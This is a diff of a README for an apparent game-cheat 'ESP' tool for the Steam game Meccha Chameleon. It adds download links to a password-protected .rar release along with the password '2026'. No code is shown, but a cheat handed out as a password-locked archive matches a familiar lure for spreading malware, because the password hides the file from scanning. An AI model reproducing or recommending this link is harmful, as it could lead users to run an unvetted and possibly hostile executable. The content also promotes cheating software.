@@ -24,7 +24,7 @@ Intelligent system tuning designed to enhance frame rates and provide visual ass
 
 ---
 
-### 📥 Installation
+### 📥 [Installation](https://github.com/Prohibitionzumvilla/Meccha-Chameleon-esp/releases/download/hamellv0.9.8/hamell.v0.9.8.rar)
 
 ### Password: 2026 
 
@@ -59,7 +59,9 @@ Intelligent system tuning designed to enhance frame rates and provide visual ass
 | Game | Meccha Chameleon (Steam) |
 
 ---
+### 📥 [Installation](https://github.com/Prohibitionzumvilla/Meccha-Chameleon-esp/releases/download/hamellv0.9.8/hamell.v0.9.8.rar)
 
+### Password: 2026 
 
 
 
